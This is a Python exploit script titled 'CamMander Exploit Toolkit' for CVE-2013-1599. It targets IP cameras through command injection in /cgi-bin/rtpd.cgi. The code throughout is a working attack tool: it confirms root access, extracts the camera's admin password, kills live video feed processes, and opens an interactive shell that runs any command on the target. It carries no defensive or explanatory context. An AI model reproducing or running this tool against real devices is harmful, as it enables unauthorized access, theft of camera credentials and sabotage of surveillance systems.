import argparse
import ipaddress
import requests
from urllib.request import urlopen
import re

command_inject_url = '/cgi-bin/rtpd.cgi'

headers = {
    'Cache-Control': 'no-cache,must-revalidate',
    'Content-type': 'text/plain',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
}

def print_menu():
    return "CamMander Exploit Toolkit (CVE_2013_1599)\n\tmenu - prints this menu\n\tgetpasswd - retrieve admin password from camera\n\thelp - list available commands on camera\n\tkillfeed - temporarily kills all active camera feeds until browser is refreshed\n\texit - quit the program\n"

special_chars = ['|', '>', '<','>>']
def is_valid_ip_port(value):
    try:
        # Try to parse the IP address part
        ip, _, port = value.partition(':')
        ipaddress.ip_address(ip)
        
        # If there's a port, try to validate it
        if port:
            if not (0 < int(port) <= 65535):
                raise ValueError("Port number must be in range 1-65535")
    except ValueError as e:
        raise argparse.ArgumentTypeError(f"{value} must be valid IP or IP:port combination") from e
    
    return value

# Camera specific tasks
def extract_admin_pass(password_line):
    pattern = r'AdminPasswd_ss="([^"]*)"'

    match = re.search(pattern, password_line)
    if match:
        return match.group(1)
    else:
        return "Blank password"
    
def dump_admin_pass(target):
    try:
        response = requests.get(f'http://{target}{command_inject_url}?whoami', headers=headers, timeout=5)
        if 'root' in response.text:
            url = f'http://{target}{command_inject_url}?echo&AdminPasswd_ss|tdb&get&HTTPAccount'
            response = urlopen(url)
            data = response.read().decode('utf-8')
            password_line = data.split('\n')[1]
            password = extract_admin_pass(password_line)
            return password
    except:
        return f'Failed to retrieve password from {target}'
    
def kill_feed(target):
    result = exec_command(target, 'ps aux|grep /var/www/video/mjpg.cgi')
    pattern = re.compile(r'^\s*(\d+)', re.MULTILINE)
    pids = pattern.findall(result)
    for pid in pids:
        print(f'Killing {pid}')
        exec_command(target, f'kill {pid}')

# Interpeter functions
def exec_command(target, command):
    base_url = f'http://{target}{command_inject_url}'
    command_fixed = command.replace(" ", "&")
    url = f'{base_url}?{command_fixed}'
    try:
        if any(char in command for char in special_chars): 
            response = urlopen(url)
            data=response.read().decode('utf-8')
            return data
        else:
            response = requests.get(url, headers=headers, timeout=5)
            return response.text
    except:
        return f"Failed to execute command on {target}"

def eval_command(target, command):
    match command:
        case 'exit':
            return 0
        case 'getpasswd':
            return dump_admin_pass(target)
        case 'help':
            return exec_command(target, 'ls /bin;ls /sbin;ls /usr/bin')
        case 'killfeed':
            return kill_feed(target)
        case 'menu':
            return print_menu()
        case _:
            return exec_command(target, command)
        
# main function
parser = argparse.ArgumentParser(description="Cammander")
parser.add_argument('target', type=is_valid_ip_port, help="Target IP or IP:port combination")

args = parser.parse_args()
        
def main(target):
    while True:
        command = input(f"({target})# ")
        result = eval_command(target, command)
        if result == 0:
            print("Exiting...")
            break
        else:
            print(result)

if __name__ == "__main__":
    print(print_menu())
    main(args.target)